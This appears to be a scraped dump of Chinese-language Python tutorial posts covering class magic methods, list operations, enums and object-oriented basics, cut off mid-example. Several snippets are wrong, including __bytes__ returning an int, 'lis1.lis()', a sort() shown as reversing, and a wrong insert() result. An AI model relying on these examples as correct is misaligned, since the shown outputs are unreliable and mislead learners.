print(\u0026#34;name:{}\u0026#34;.format(a)) # name:demo 8.__del__（删除对象） 该魔法方法在删除一个实例对象时使用。\n1 2 3 4 5 6 7 class Demo(object): def __del__(self): print(\u0026#39;Have been deleted\u0026#39;) a = Demo() del a # Have been deleted 9.__call__（实例对象像函数一样调用） 该魔法方法可以使实例对象像函数一样被调用。在下面这个例子中，执行 a(\u0026lsquo;Python\u0026rsquo;) 该语句时，实际执行的是 a.__call__(\u0026lsquo;Python\u0026rsquo;)。\n1 2 3 4 5 6 7 class Demo(object): def __call__(self, *args, **kwargs): print(f\u0026#39;__call__(self, *{args}, **{kwargs}):\u0026#39;) a = Demo() a(\u0026#39;Python\u0026#39;) # Python 10.__len__（len()） 当调用 len() 方法获取对象长度时，就会调用该方法。\n1 2 3 4 5 6 7 class Demo(object): def __len__(self): return 10 a = Demo() print(len(a)) # 10 11.__int__（int()） 调用 int() 方法时会调用类中该方法。\n1 2 3 4 5 6 7 class Demo(object): def __int__(self): return 10 a = Demo() print(int(a)) # 10 12.__float__（float()） 调用 float() 方法时会调用类中该方法。\n1 2 3 4 5 6 7 class Demo(object): def __float__(self): return 10.0 a = Demo() print(float(a)) # 10.0 13.__bytes__（bytes()） 调用 bytes() 方法时会调用类中该方法。\n1 2 3 4 5 6 7 class Demo(object): def __bytes__(self): return 10 a = Demo() print(bytes(a)) # 10 14.__bool__（bool()） 调用 bool() 方法时会调用类中该方法。\n1 2 3 4 5 6 7 class Demo(object): def __bool__(self): return True a = Demo() print(bool(a)) # True 15.__round__（round()） 调用 round() 方法时会调用类中该方法。\n1 2 3 4 5 6 7 class Demo(object): def __round__(self): return 10 a = Demo() print(round(a)) # 10 二、属性操作 1. __delattr__（删除属性） 在删除类的实例属性时，该方法会自动调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Demo(object): def __init__(self): self.name = \u0026#39;demo\u0026#39; def __delattr__(self, item): # item会传入被删除的属性名 print(item, \u0026#39;: 该属性已被删除\u0026#39;) super().__delattr__(item) # 重写该方法后需要继承object类的该方法才能够真正删除实例属性 a = Demo() del a.name # name : 该属性已被删除 2. __getattribute__（访问属性） getattribute是属性访问拦截器。当类中的方法和属性被访问时，就会首先调用这个方法。只要是继承object了的类，就默认存在属性拦截器，只是调用后没有进行任何操作，而是直接返回。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Demo(object): def __init__(self): self.name = \u0026#39;demo\u0026#39; def test(self): print(\u0026#39;Hello World!\u0026#39;) def __getattribute__(self, item): print(f\u0026#34;{item} property is called!\u0026#34;) return super().__getattribute__(item) # 调用object的方法返回 a = Demo() print(a.name) a.test() \u0026#34;\u0026#34;\u0026#34;\u0026#34; name property is called! demo test property is called! Hello World! \u0026#34;\u0026#34;\u0026#34; 3. __setattr__（设置属性） 当我们为实例对象设置属性时会调用该魔法方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Demo(object): def __init__(self, name): self.name = name def __setattr__(self, key, value): print(f\u0026#34;__setattr__({self}, {key}, {value})\u0026#34;) super().__setattr__(key, value) #必须要调用object的该方法才能成功设置属性 a = Demo(\u0026#39;Python\u0026#39;) a.name = \u0026#39;Java\u0026#39; \u0026#34;\u0026#34;\u0026#34; __setattr__(\u0026lt;__main__.Demo object at 0x0000032F586D1CC8\u0026gt;, name, Python) __setattr__(\u0026lt;__main__.Demo object at 0x0000032F586D1CC8\u0026gt;, name, Java) \u0026#34;\u0026#34;\u0026#34; 4. __repr__（显示对象属性） 该魔法方法的功能是显示实例对象的属性。 当我们采用下面的方式输出时，打印结果为：类名+object at+内存地址，这样的结果对我们用处不大，这个时候我们就可以通过重写__repr__方法来输出我们想要的结果。 重写前：\n1 2 3 4 5 6 class Demo(object): pass a = Demo() print(a) # \u0026lt;__main__.Demo object at 0x00000000E70B1208\u0026gt; 重写后：\n1 2 3 4 5 6 7 8 class Demo(object): def __repr__(self): return \u0026#34;I\u0026#39;m a Demo.\u0026#34; a = Demo() print(a) # I\u0026#39;m a Demo. 5. __str__（显示对象属性） 该魔法方法和__repr__方法的功能是极为类似的，都是在查看属性时返回信息。 不同之处： __repe__函数返回的信息是数据的元数据，一般供给程序员查看，通过object和repr（object）来调用； __str__函数返回的是经过转换过的数据，一般给用户查看，通过print (objects)来调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Demo(object): def __str__(self): return \u0026#39;Demo\u0026#39; def __repr__(self): return \u0026#39;demo\u0026#39; a = Demo() print(str(a)) print(repr(a)) \u0026#34;\u0026#34;\u0026#34; Demo demo \u0026#34;\u0026#34;\u0026#34; 三、 对象间比较操作 魔法方法 比较方法 __eq__ == __ne__ != __ge__ \u0026gt;= __gt__ \u0026gt; __le__ \u0026lt;= __lt__ \u0026lt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Demo(object): def __init__(self, name): self.name = name def __eq__(self, other): return self.name == other.name def __ne__(self, other): return self.name != other.name def __ge__(self, other): return self.name \u0026gt;= other.name def __gt__(self, other): return self.name \u0026gt; other.name def __lt__(self, other): return self.name \u0026lt; other.name def __le__(self, other): return self.name \u0026lt;= other.name a = Demo(\u0026#39;Python\u0026#39;) b = Demo(\u0026#39;Java\u0026#39;) print(a == b) print(a \u0026gt;= b) print(a \u0026lt;= b) print(a \u0026gt; b) print(a \u0026lt; b) \u0026#34;\u0026#34;\u0026#34; False True False True False \u0026#34;\u0026#34;\u0026#34; 如果我们想要完善方法，这样一个一个写是比较麻烦的，这个时候我们就可以引入一个外部装饰器来帮助我们完善类比较的方法。 只要我们定义的类中有__ge__、__gt__、__lt__、__le__中任意一个魔法方法，就可以完善所有的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from functools import total_ordering @total_ordering class Demo(object): def __init__(self, name): self.name = name def __eq__(self, other): return self.name == other.name def __le__(self, other): return self.name \u0026lt;= other.name a = Demo(\u0026#39;Python\u0026#39;) b = Demo(\u0026#39;Java\u0026#39;) print(a == b) print(a \u0026gt;= b) print(a \u0026lt;= b) print(a \u0026gt; b) print(a \u0026lt; b) \u0026#39;\u0026#39;\u0026#39; False True False True False \u0026#39;\u0026#39;\u0026#39; 注意：在Python中，当我们只定义一个相反比较时只定义其中一个时，在进行比较时会自动取反。如果两个都定义了就分别调用两个方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Demo(object): def __init__(self, name): self.name = name def __gt__(self, other): print(self.name, other.name) return self.name \u0026gt; other.name a = Demo(\u0026#39;Python\u0026#39;) b = Demo(\u0026#39;Java\u0026#39;) print(a \u0026gt; b) print(a \u0026lt; b) \u0026#34;\u0026#34;\u0026#34; Python Java True Java Python False \u0026#34;\u0026#34;\u0026#34; 四、运算符方法 1. 运算符 可以通过重写下面的魔法方法使实例对象可以进行运算。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 class Demo(object): def __init__(self, num): self.num = num def __add__(self, other): # 加法 return self.num + other.num def __sub__(self, other): # 减法 return self.num - other.num def __mul__(self, other): # 乘法 return self.num * other.num def __truediv__(self, other): # 除法 return self.num / other.num def __floordiv__(self, other): # 整除 return self.num // other.num def __mod__(self, other): # 取余 return self.num % other.num def __pow__(self, power, modulo=None): # 幂运算 return self.num ** power.num def __divmod__(self, other): # divmod() return divmod(self.num, other.num) def __lshift__(self, other): # 左移 return self.num \u0026lt;\u0026lt; other.num def __rshift__(self, other): # 右移 return self.num \u0026gt;\u0026gt; other.num def __and__(self, other): # 按位与 return self.num \u0026amp; other.num def __or__(self, other): # 按位或 return self.num | other.num def __xor__(self, other): # 按位异或 return self.num ^ other.num a = Demo(2) b = Demo(3) print(a + b) print(a - b) print(a * b) print(a / b) print(a // b) print(a % b) print(a ** b) print(divmod(a, b)) print(a \u0026lt;\u0026lt; b) print(a \u0026gt;\u0026gt; b) print(a \u0026amp; b) print(a | b) print(a ^ b) \u0026#34;\u0026#34;\u0026#34; 5 -1 6 0.6666666666666666 0 2 8 (0, 2) 16 0 2 3 1 \u0026#34;\u0026#34;\u0026#34; 2. 反运算符 在运算符魔法方法前加一个 r 即构成反运算符方法。 例如： 在 a + b 时，如果a有 __add__() 方法，那么就执行 a.__add__(b) 操作；如果 a 没有 __add__() 魔法方法，就调用 b的 __radd__() 方法，执行 b.__radd__(a) 操作；如果以上条件都不满足，则抛出 TypeError。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Demo(object): def __init__(self, num): self.num = num def __radd__(self, other): print(self.num, other.num) return self.num + other.num class De(object): def __init__(self, num): self.num = num a = Demo(2) b = De(3) print(b + a) \u0026#34;\u0026#34;\u0026#34; 2 3 5 \u0026#34;\u0026#34;\u0026#34; 3. 增量赋值运算符 在运算符前面加一个 i即可实现增量赋值运算。 例如： i\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Demo(object): def __init__(self, num): self.num = num def __iadd__(self, other): return self.num + other.num a = Demo(2) b = Demo(3) a += b print(a) \u0026#34;\u0026#34;\u0026#34; 5 \u0026#34;\u0026#34;\u0026#34; 4. 一元操作符 下列方法可以实现一元操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Demo(object): def __init__(self, num): self.num = num def __pos__(self): return abs(self.num) def __neg__(self): return -self.num def __abs__(self): return abs(self.num) def __invert__(self): return ~self.num a = Demo(2) print(+a) print(-a) print(abs(a)) print(~a) \u0026#34;\u0026#34;\u0026#34; 2 -2 2 -3 \u0026#34;\u0026#34;\u0026#34; 五、描述符 关于描述符的介绍可以参照下面这位大佬的文章： 大佬的文章\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Demo(object): def __init__(self, name): self.name = name def __get__(self, instance, owner): print(\u0026#39;get\u0026#39;, instance, owner) def __set__(self, instance, value): print(\u0026#39;set\u0026#39;, instance, value) def __delete__(self, instance): print(\u0026#39;delete\u0026#39;, instance) class demo(object): x = Demo(\u0026#39;Python\u0026#39;) a = demo() print(a.x) a.x = 1 del a.x 六、容器操作 1. __len__（获取对象长度） 使用 len() 函数时会调用该魔法方法。\n1 2 3 4 5 6 7 8 9 10 11 class Demo(object): def __init__(self, name): self.name = name def __len__(self): return len(self.name) a = Demo(\u0026#39;Python\u0026#39;) print(len(a)) # 6 2. __iter__（定义迭代器） 用该方法创建一个迭代器对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Demo(object): def __init__(self, data): self.data = data def __iter__(self): return self def __next__(self): self.data += 1 return self.data a = iter(Demo(1)) print(next(a)) print(next(a)) # 2 # 3 3. 对容器指定元素的操作 对容器内指定元素操作时调用下列方法（字典操作）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Demo(object): def __getitem__(self, item): print(\u0026#39;__getitem__\u0026#39;, item) def __setitem__(self, key, value): print(\u0026#39;__setitem__\u0026#39;, key, value) def __delitem__(self, key): print(\u0026#39;__delitem__\u0026#39;, key) a = Demo() a[\u0026#39;a\u0026#39;] a[\u0026#39;b\u0026#39;] = 123 del a[\u0026#39;c\u0026#39;] \u0026#34;\u0026#34;\u0026#34; __getitem__ a __setitem__ b 123 __delitem__ c \u0026#34;\u0026#34;\u0026#34; 4. __reversed__（反转） 当调用 reversed() 函数时调用该魔法方法。\n1 2 3 4 5 6 7 8 9 10 11 class Demo(object): def __init__(self, name): self.name = name def __reversed__(self): return self.name[::-1] a = Demo(\u0026#39;Python\u0026#39;) print(reversed(a)) # nohtyP 5. __contains__（判断元素位置） 当调用 in 或者 not in 判断元素是否在对象中时会调用该魔法方法。\n1 2 3 4 5 6 7 8 9 10 11 class Demo(object): def __init__(self, name): self.name = name def __contains__(self, item): return item in self.name a = Demo(\u0026#39;Python\u0026#39;) print(\u0026#39;P\u0026#39; in a) print(\u0026#39;P\u0026#39; not in a) 七、with语句 with语句是Python中的上下文管理器，可以利用魔法方法来实现自定义。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class Demo(object): def __enter__(self): print(\u0026#34;start\u0026#34;) return self def __exit__(self, exc_type, exc_val, exc_tb): print(\u0026#39;end\u0026#39;) print(exc_type, exc_val, exc_tb) def __init__(self): self.name = \u0026#39;Python\u0026#39; a = Demo() with a as b: print(b.name) \u0026#39;\u0026#39;\u0026#39; start Python end None None None \u0026#39;\u0026#39;\u0026#39; with a: raise ImportError \u0026#39;\u0026#39;\u0026#39; start end \u0026lt;class \u0026#39;ImportError\u0026#39;\u0026gt; \u0026lt;traceback object at 0x0000026C1C391F88\u0026gt; \u0026#39;\u0026#39;\u0026#39; __enter__()方法管理上文（即开始时刻），__exit__()方法管理下文（即退出时刻）。 __enter__()方法的返回值可以通过as语句接收； __exit__()方法的参数exc_type, exc_val, exc_tb用以接收异常类型，异常值，异常跟踪信息。当没有异常时三个参数都为None。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E7%B1%BB%E7%9A%84%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95/","title":"Python学习之路——类的魔法方法"},{"content":"Python 学习之路——列表(list) 列表是最常用的Python数据类型。\n一、创建列表 1 2 3 4 5 6 7 # 方式一 list1 = [\u0026#39;Python\u0026#39;] # 方式二 list2 = list() # 在list()中可传递一个可迭代对象，如果不传参数则生成一个空列表 # 例子: lis3 = list(\u0026#39;Python\u0026#39;) # lis3=[\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] 二、访问列表的值 1. 通过索引访问 列表作为Python序列结构的一种，可以通过访问索引值进行访问列表。列表的索引值从0开始。\n1 2 lis = [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] print(lis[0]) #P 当访问的索引值超过列表的最大索引值时就会抛出异常。\n1 2 3 lis = [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] print(lis[6]) # IndexError: list index out of range 2. 切片操作 列表可以进行切片截取操作。\n1 2 3 4 5 lis = [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] print(lis[1:5:3]) # [\u0026#39;y\u0026#39;, \u0026#39;o\u0026#39;] # list[start:end:step] # 进行切片操作时可以传递三个值，分别是开始索引，结束索引和步长 # 开始索引默认为0，结束索引默认为最大索引值，步长默认为1 切片骚操作 1）反转列表\n1 2 lis = [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] print(lis[::-1]) # [\u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;P\u0026#39;] 2）复制列表\n1 2 3 lis = [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] li = lis[:] print(li) # [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] 三、列表的特殊操作 1. 列表的拼接 1 2 3 4 5 6 7 8 9 10 11 12 13 lis1 = [1, 2, 3] lis2 = [4, 5, 6] # \u0026#34;+\u0026#34; 可以将两个列表进行首尾相接 lis3 = lis1 + lis2 print(lis3) # [1, 2, 3, 4, 5, 6] # 魔术方法 面向对象 lis1.__add__(lis2) # [1, 2, 3, 4, 5, 6] # \u0026#34;*\u0026#34; 可以让一个列表元素进行重复 lis4 = lis1 * 2 print(lis4) # [1, 2, 3, 1, 2, 3] # 魔术方法 面向对象 lis1.__imul__(2) # [1, 2, 3, 1, 2, 3] 2. 判断元素是否在列表内部 1 2 lis = [1, 2, 3] 2 in lis # True 3. 列表的遍历 列表作为一种可迭代对象，是可以利用for进行遍历的\n1 2 3 4 5 6 lis = [1, 2, 3] for i in lis: print(i) # 1 # 2 # 3 4. 列表推导式 Python作为一门及其优雅的语言，可以用极其简单的语言就可以实现强大的功能。列表推导式就是如此：\n1 2 li = [i for i in range(10)] print(li) # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 四、列表常用函数 1.求取列表长度(len) 1 2 3 4 5 lis = [1, 2, 3] # len()函数 len(lis) # 3 # 魔法方法 面向对象 lis.__len__() # 3 2.求取列表元素的最值(max,min) 1 2 3 4 5 lis = [1, 2, 3] # max()函数求取列表元素的最大值 max(lis) # 3 # min()函数求取列表元素的最小值 min(lis) # 1 3. 对列表里的元素排序(sorted) 1 2 3 lis = [1, 2, 3, 6, 4, 5] # sorted()函数可对可迭代对象进行排序，并返回一个列表 sorted(lis) # [1, 2, 3, 4, 5, 6] 4. 对列表进行反转(reversed) 1 2 3 4 5 6 7 lis = [1, 2, 3] # reversed()函数可以对可迭代对象进行排序，并返回一个迭代器 for i in reversed(lis): print(i) # 3 # 2 # 1 五、列表常用方法 1. 添加列表元素(append) 1 2 3 lis = [1, 2, 3] # append()方法可以将传入元素添加到列表末尾 lis.append(4) # [1, 2, 3, 4] 2. 统计某个元素在列表中出现的次数(count) 1 2 3 4 lis = [1, 2, 3, 3] # count()方法可以统计元素在列表中的出现次数，并返回次数 # 如果需要统计的元素不在列表则返回 0 而不会抛出异常 lis.count(3) # 2 3. 一次性添加多个列表值(extend) 1 2 3 lis = [1, 2, 3] # extend()方法在列表末尾一次性追加另一个序列中的多个值 lis.extend([4, 5, 6]) # [1, 2, 3, 4, 5, 6] 4. 在列表指定位置插入元素(insert) 1 2 3 4 lis = [1, 2, 3] # insert(pobj,index)方法可以将对象插入到列表指定位置 # 指定位置大于列表最大索引时默认插入列表最后而不会抛出异常 lis.insert(4, 3) # [1, 2, 3, 4] 5. 获取列表元素第一个匹配项的索引位置(index) 1 2 3 4 5 6 lis = [1, 2, 3] # index()方法可以从列表中找出某个值第一个匹配项的索引位置 lis.index(3) # 2 # 当查找元素不在列表时会抛出异常 lis.index(4) # ValueError: 4 is not in list 6. 移除列表指定位置的元素并返回该元素(pop) 1 2 3 4 5 6 lis = [1, 2, 3] # pop()方法可以移除列表指定位置元素(默认最后一个元素)并返回该元素的值 lis.pop(2) # 3 # 当指定位置大于列表最大索引值时会抛出异常 lis.pop(3) # IndexError: pop index out of range 7. 移除列表中某个值的第一个匹配项(remove) 1 2 3 4 5 6 lis = [1, 2, 3] # remove()方法可以移除列表中某个值的第一个匹配项 lis.remove(1) # lis = [2, 3] # 当传入元素不在列表时会抛出异常 lis.remove(4) # ValueError: list.remove(x): x not in list 8. 对列表进行反转(reverse) 1 2 3 lis = [1, 2, 3] # reverse()方法可以将列表中元素进行反转 lis.reverse() # lis = [3, 2, 1] 9. 复制列表(copy） 1 2 3 lis = [1, 2, 3] # copy()方法可以对列表进行浅复制 lis1.lis() # lis1 = [1, 2, 3] 10. 清空列表（clear) 1 2 3 lis = [1, 2, 3] # clear()方法会清空列表 lis.clear() # lis = [] 11. 对列表进行排序(sort) 1 2 3 4 5 6 7 8 9 10 11 12 lis = [1, 2, 3, 6, 5, 4] # sort()方法可以对列表进行排序 lis.sort() # lis = [1, 2, 3, 4, 5, 6] # sort()方法中可传入reverse 参数 # 如果将该参数设置为 True则表示反向排序（默认从小到大） lis.sort() # lis = [6, 5, 4, 3, 2, 1] # sort()方法中还可以传入key 参数 # 该参数可指定一个函数来生成排序的关键值 lis1 = [1, 2, 3, 4, 5, 6, \u0026#34;0\u0026#34;] lis.sort(key=int) # lis = [\u0026#39;0\u0026#39;, 1, 2, 3, 4, 5, 6] ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%88%97%E8%A1%A8list/","title":"Python学习之路——列表（list）"},{"content":"Python 学习之路——枚举类 前言: 首先大家要明白的是：枚举类不是Python的原生类！不是原生类！不是！Python中的枚举类是依靠 enum模块 来实现的。 枚举是在 Python3.4 添加的新功能（安装Python解释器后自带的官方模块），3.4以前的版本需要使用pip install enum来安装模块后使用。\n一、枚举 什么是枚举？ 枚举可看作是一系列符号名称的集合，集合中每一个元素要保证唯一性和不可变（与字典类似）。因此我们可以对枚举中元素进行恒等比较，通俗来讲枚举就是一系列常量的集合，枚举是可迭代的。\n枚举的作用 首先我们先思考一下，在 Python中我们如何定义常量？\n我们最常用的做法是采用变量名大写的方式来定义常量。\n这种方式虽然简单，但问题在于我们定义的仍然是变量、是可以被修改的，而常量是什么呢？简单来说就是不可变的量。\n枚举就有不可变的特性，因此枚举的主要作用就来定义常量。\n二、代码实现 enum 库中定义了四个枚举类，它们是可被用来定义名称和值的不重复集合: Enum, IntEnum, Flag 和 IntFlag。 此外还定义了一个装饰器 unique() 和一个辅助类 auto。\n名称 功能 Enum 创建枚举常量 IntEnum 创建属于 int 的子类的枚举常量 IntFlag 创建可使用按位运算符进行组合而不会丢失其 IntFlag 成员资格的枚举常量。 IntFlag 成员同样也是 int 的子类 Flag 创建可使用按位运算符进行组合而不会丢失其 Flag 成员资格的枚举常量 unique() 确保只将一个名称绑定到任意一个值 auto 实例会被替换为一个可作为 Enum 成员的适当的值。 初始值从 1 开始 1. Enum类 继承Enum类进行创建：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from enum import Enum class Color(Enum): BLACK = \u0026#39;#000000\u0026#39; RED = \u0026#39;#FF0000\u0026#39; GREEN = \u0026#39;#00FF00\u0026#39; BLUE = \u0026#39;#0000FF\u0026#39; WHITE = \u0026#39;#FFFFFF\u0026#39; print(Color) # \u0026lt;enum \u0026#39;Color\u0026#39;\u0026gt; print(Color.RED) # Color.RED print(Color.BLACK.name) # BLACK print(Color.GREEN.value) # #00FF00 枚举类中不允许有同名的枚举成员，当定义两个同名枚举成员时就会抛出错误：\n1 2 3 4 5 6 class Animal(Enum): CAT = 1 CAT = 2 Animal() # TypeError: Attempted to reuse key: \u0026#39;CAT\u0026#39; 直接使用Enum进行创建：\n1 2 3 4 5 6 from enum import Enum Animal = Enum(\u0026#39;Animal\u0026#39;, \u0026#39;ANT BEE CAT DOG\u0026#39;) print(Animal) # \u0026lt;enum \u0026#39;Animal\u0026#39;\u0026gt; print(Animal.ANT) # \u0026lt;Animal.ANT\u0026gt; print(Animal.ANT.value) # 1 Enum 传入的第一参数是枚举的名称，第二个参数是枚举成员名称的 来源。 它可以是一个用空格分隔的名称字符串、名称序列、键/值对 2 元组的序列，或者名称到值的映射（例如字典）。\n最后两种选项使得可以为枚举任意赋值；其他选项会自动以从 1 开始递增的整数赋值（使用 start 形参可指定不同的起始值）。\n枚举类可以直接使用 for语句进行遍历:\n1 2 3 4 5 6 7 8 9 10 11 from enum import Enum Animal = Enum(\u0026#39;Animal\u0026#39;, \u0026#39;ANT BEE CAT DOG\u0026#39;) for i in Animal: print(i, \u0026#39;*\u0026#39;, i.name, \u0026#39;*\u0026#39;, i.value) \u0026#39;\u0026#39;\u0026#39; Animal.ANT * ANT * 1 Animal.BEE * BEE * 2 Animal.CAT * CAT * 3 Animal.DOG * DOG * 4 \u0026#39;\u0026#39;\u0026#39; 枚举成员之间可以使用 is 和 ==、!=进行比较，但不能使用\u0026lt; 、\u0026gt;、\u0026gt;=、\u0026lt;=进行比较。\n1 2 3 4 5 6 7 8 9 from enum import Enum class Animal(Enum): CAT = 1 DOG = 0 print(Animal.CAT == Animal.DOG) # False print(Animal.CAT is Animal.DOG) # False 2. IntEnum类 IntEmum 的用法与 Enum 类似，但是 IntEnum 的成员可与整数进行比较：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from enum import IntEnum class Shape(IntEnum): CIRCLE = 1 SQUARE = 2 class Request(IntEnum): POST = 1 GET = 2 print(Shape == 1) # False print(Shape.CIRCLE == 1) # True print(Shape.CIRCLE == Request.POST) # True 不过，它们仍然不可与标准 Enum 枚举进行比较:\n1 2 3 4 5 6 7 8 9 class Shape(IntEnum): CIRCLE = 1 SQUARE = 2 class Color(Enum): RED = 1 GREEN = 2 print(Shape.CIRCLE == Color.RED) # False 3. IntFlag类 IntFlag 类同样是基于 int 的，不同之处在于 IntFlag 成员可使用按位运算符 \u0026amp;, |, ^, ~ 进行组合且结果仍然为 IntFlag 成员。 正如名称所表明的，IntFlag 成员同时也是 int 的子类，并能在任何使用 int 的场合被使用。 IntFlag 成员进行除按位运算以外的其他运算都将导致失去 IntFlag 成员资格。\n1 2 3 4 5 6 7 8 9 10 11 12 from enum import IntFlag class Perm(IntFlag): R = 4 W = 2 X = 1 print(Perm.R | Perm.W) # Perm.R|W print(Perm.R + Perm.W) # 6 RW = Perm.R | Perm.W print(Perm.R in RW) # True print(Perm.R | 8) # Perm.8|R 4. Flag类 与 IntFlag 类似，Flag 成员可使用按位运算符 (\u0026amp;, |, ^, ~) 进行组合，与 IntFlag 不同的是它们不可与任何其它 Flag 枚举或 int 进行组合或比较。 虽然可以直接指定值，但推荐使用 auto 作为值以便让 Flag 选择适当的值。\n1 2 3 4 5 6 7 8 9 from enum import Flag, auto class Color(Flag): RED = auto() BLUE = auto() GREEN = auto() print(Color.RED \u0026amp; Color.GREEN) # Color.0 print(bool(Color.RED \u0026amp; Color.GREEN)) # False 5. unique装饰器 默认情况下，枚举允许有多个名称作为某个相同值的别名。 如果不想要这样的行为，可以使用 unique 装饰器来确保每个值在枚举中只被使用一次:\n1 2 3 4 5 6 7 8 9 from enum import Enum, unique @unique class Mistake(Enum): ONE = 1 TWO = 2 THREE = 3 FOUR = 3 # ValueError: duplicate values found in \u0026lt;enum \u0026#39;Mistake\u0026#39;\u0026gt;: FOUR -\u0026gt; THREE 6. auto函数 如果确切的值不重要，你可以使用 auto：\n1 2 3 4 5 6 7 8 from enum import Enum, auto class Color(Enum): RED = auto() BLUE = auto() GREEN = auto() print(list(Color)) # [\u0026lt;Color.RED: 1\u0026gt;, \u0026lt;Color.BLUE: 2\u0026gt;, \u0026lt;Color.GREEN: 3\u0026gt;] 三、官方文档 有关 Enum模块 的更多信息可以参考官方文档：官方文档\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%9E%9A%E4%B8%BE%E7%B1%BB/","title":"Python学习之路——枚举类"},{"content":"Python 学习之路——面向对象入门 一、面向对象简介 总所皆知，Python语言是一门面向对象得语言。那么，对象是什么？面向对象又是什么？ 万物皆对象。任何一个实体都是对象，例如一个人，一辆车等等，这些都是一个又一个对象。 面向对象也就是描述对象的的过程，比如一个人有身高、年龄等特征，还有睡觉、走路等行为，面向对象就是要把对象的特征及其行为添加到对象的身上，使之丰满具体。\n面向对象有着三大特征： 封装 确保对象中的数据更安全 继承 保证了对象的可扩展性 多态 保证了程序的灵活性\n二、对象的结构 在Python中，每一个对象都是由三部分构成的：id（标识）、type（类型）和value（值）。 id(标识)：id 用来标识对象的唯一性，每个对象都有唯一的id，id 是由解释器生成的，id就是对象的内存地址。在Python中可以通过id()函数来查看对象的的id。 type(类型)：类型就决定了对象有哪些功能，在Python中可以通过type()函数来查看对象的类型。 value(值)：值指的就是对象中存储的具体数据，可变对象的值可变，不可变对象的值不可变。\n五、类 在Python中，类是一个很重要的结构。类是什么？类本质上也是一个对象(类是一个用来创建对象的对象)。类就像是一张白纸，需要我们来对其进行描绘。\n1. 定义一个类 1 2 3 4 class Myclass(): pass a = Myclass() 在上面的代码中，我们先是创建了一个名字为Myclass的类，然后创建了一个Myclass类型的对象a。在Python中我们可以用isinstance()函数来检查一个对象是否是一个类的实例。\n1 print(isintance(a, Myclass) # True 2. 为类添加属性和方法 在类中，可以定义为类定义变量和函数： 在类中的变量将会成为所有实例的公共属性。所有实例都可以访问这些变量； 在类中可以定义函数，类中的函数我们称之为方法，这些方法该类的实例都可以访问， 如果是函数，有几个形参传几个实参，如果是方法 默认传递一个参数 所以类中的方法至少要定义一个形参：self。\n1 2 3 4 5 6 7 8 class Myclass(): name = \u0026#39;Python\u0026#39; def speak(self): print(\u0026#39;Life is short, I use Python\u0026#39;) a = Myclass() print(a.name) # Python a.speak() # \u0026#39;Life is short, I use Python\u0026#39; 在上面的代码中，我们定义了一个Myclass类，并为其添加了一个name属性和一个speak方法。然后为我们定义的类初始化了一个实例，并访问了属性使用了方法。\n3. 添加魔术方法 在Python的类中，有着特殊方法，特殊方法都是以“__”双下划线开头，特殊方法不需要我们自己调用，在特殊情况下会自动调用。\n__init__() 在对类进行实例化的过程中，会自动调用__init__()方法，__init__()方法可以用来初始化新建对象的属性。\n1 2 3 4 5 6 7 8 9 class Myclass(): def __init__(self, name): self.name = name def speak(self): print(self.name) a = 